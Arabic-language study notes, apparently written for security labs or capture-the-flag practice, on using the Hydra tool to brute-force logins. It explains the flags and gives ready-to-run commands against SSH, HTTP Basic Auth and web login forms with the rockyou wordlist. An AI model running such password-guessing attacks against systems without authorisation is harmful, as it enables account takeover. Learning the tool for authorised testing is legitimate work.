
هي أداة:

```
Password Brute Force / Login Cracking
```

تستخدم لتجربة:

- Users
- Passwords

على خدمات مختلفة.


# أشهر الخدمات التي تدعمها Hydra 

- SSH
- FTP
- RDP
- SMB
- HTTP
- HTTPS
- Telnet
- MySQL
- PostgreSQL
- VNC
---
# لشكل العام للأمر 

```
hydra [options] service://target
```

# مثال SSH 

```
hydra -l root -P passwords.txt ssh://192.168.1.10
```

# الفرق بين `-l` و `-L` 
## `-l`

User واحد.

```
-l admin
```

---

## `-L`

ملف Users.

```
-L users.txt
```

---

# الفرق بين `-p` و `-P` 

## `-p`

Password واحدة.

---

## `-P`

ملف Passwords.

## `-t`

عدد الـ Threads.

```
-t 4
```

كلما زاد:

- أسرع
- لكن قد يسبب حظر.

## `-V`

عرض كل المحاولات.

## `-q`

تقليل الإخراج.

---

## `-Q`

هادئ جدًا.

---

## `-f`

يتوقف عند أول نجاح.

مفيد جدًا.


---
# hydra for web

# 1) HTTP Basic Authentication

مثل النافذة المنبثقة:

```
Username:Password:
```

التي تظهر من المتصفح مباشرة.


# كيف تعرف أنه Basic Auth؟ 

غالبًا:

- تظهر Popup من المتصفح
- أو Header فيه:

```
WWW-Authenticate
```


# كيف نهاجمه بـ Hydra؟ 

نستخدم:

```
http-get
```

أو:

```
http-head
```


# مثال 

```
hydra -L users.txt -P passwords.txt -s port number 10.0.0.5 http-get /
```


Ex:
	hydra -L users.txt -P passwords.txt 10.128.163.215 -s 8080 http-get /

---

# ماذا يعني؟ 

## `http-get`

يعني:

```
الموقع يستخدم Basic Auth عبر GET request
```


## `/`

المسار المطلوب حمايته.



---
#  On login page 


`hydra -f -V -l username -P /usr/share/wordlists/rockyou.txt 10.82.135.6 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"`




معلومات الخطا من الموقع نفسه
حق pass ,user  من اداة burbsuit


```
hydra -L users.txt -P passwords.txt 10.0.0.5 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

الصيغة دائمًا:

```
"path:parameters:failure_message"
```
# ماذا لو الموقع يستخدم HTTPS؟ 

استخدم:

```
https-post-form
```

أو:

```
https-get
```